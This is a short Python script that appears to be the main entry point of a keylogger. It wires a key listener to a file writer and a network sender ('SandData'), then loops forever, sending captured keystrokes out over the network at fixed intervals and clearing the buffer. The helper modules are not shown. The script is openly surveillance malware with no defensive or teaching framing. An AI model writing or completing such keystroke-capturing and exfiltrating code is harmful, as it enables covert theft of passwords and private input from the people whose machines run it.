import time
from key_writer import FileWriter
from key_listener import Listener
from key_logger_manager import Manager
from sand_data import SandData
listener = Listener()
writer= FileWriter('kk.txt')
networkwriter = SandData()




def main(listen, write):

    manager= Manager(listen,write, networkwriter,5)
    manager.run()
    while True:
        time.sleep(manager.space)
        # manager.write(listen.keys)
        manager.networkwriter.sand(listen.keys)
        listen.keys.clear()



main(listener,writer,)